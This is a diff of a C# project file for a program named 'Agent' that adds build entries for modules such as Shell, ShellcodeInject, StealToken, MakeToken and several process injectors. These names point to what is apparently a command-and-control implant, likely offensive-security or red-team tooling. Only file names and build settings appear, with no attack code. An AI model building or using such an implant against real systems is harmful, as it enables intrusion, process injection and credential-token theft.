@@ -4,13 +4,12 @@
   <PropertyGroup>
     <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
     <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
-    <ProjectGuid>{0544276C-3830-4886-B706-ED2608D3B5B0}</ProjectGuid>
+    <ProjectGuid>{31CDE47E-9301-4515-934C-711DF9490606}</ProjectGuid>
     <OutputType>Exe</OutputType>
     <RootNamespace>Agent</RootNamespace>
     <AssemblyName>Agent</AssemblyName>
-    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
+    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
     <FileAlignment>512</FileAlignment>
-    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
     <Deterministic>true</Deterministic>
   </PropertyGroup>
   <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
@@ -22,6 +21,7 @@
     <DefineConstants>DEBUG;TRACE</DefineConstants>
     <ErrorReport>prompt</ErrorReport>
     <WarningLevel>4</WarningLevel>
+    <Prefer32Bit>false</Prefer32Bit>
   </PropertyGroup>
   <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
     <PlatformTarget>AnyCPU</PlatformTarget>
@@ -44,14 +44,39 @@
     <Reference Include="System.Xml" />
   </ItemGroup>
   <ItemGroup>
+    <Compile Include="Commands\ChangeDirectory.cs" />
+    <Compile Include="Commands\CreateDirectory.cs" />
+    <Compile Include="Commands\DeleteDirectory.cs" />
+    <Compile Include="Commands\ExecuteAssembly.cs" />
+    <Compile Include="Commands\ListDirectory.cs" />
+    <Compile Include="Commands\ListProcesses.cs" />
+    <Compile Include="Commands\MakeToken.cs" />
+    <Compile Include="Commands\PrintWorkingDirectory.cs" />
+    <Compile Include="Commands\RevToSelf.cs" />
+    <Compile Include="Commands\Run.cs" />
+    <Compile Include="Commands\Shell.cs" />
+    <Compile Include="Commands\ShellcodeInject.cs" />
+    <Compile Include="Commands\StealToken.cs" />
+    <Compile Include="Commands\TestCommand.cs" />
+    <Compile Include="Commands\WhoAmI.cs" />
     <Compile Include="Extensions.cs" />
+    <Compile Include="Generic.cs" />
+    <Compile Include="Internal\Execute.cs" />
+    <Compile Include="Internal\Injector.cs" />
+    <Compile Include="Internal\RemoteInjector.cs" />
+    <Compile Include="Internal\SelfInjector.cs" />
+    <Compile Include="Internal\SpawnInjector.cs" />
+    <Compile Include="Models\AgentCommand.cs" />
     <Compile Include="Models\AgentMetadata.cs" />
     <Compile Include="Models\AgentTask.cs" />
     <Compile Include="Models\AgentTaskResult.cs" />
     <Compile Include="Models\CommModule.cs" />
     <Compile Include="Models\HttpCommModule.cs" />
+    <Compile Include="Native\Advapi.cs" />
+    <Compile Include="Native\Kernel32.cs" />
     <Compile Include="Program.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Utilities.cs" />
   </ItemGroup>
   <ItemGroup>
     <None Include="App.config" />
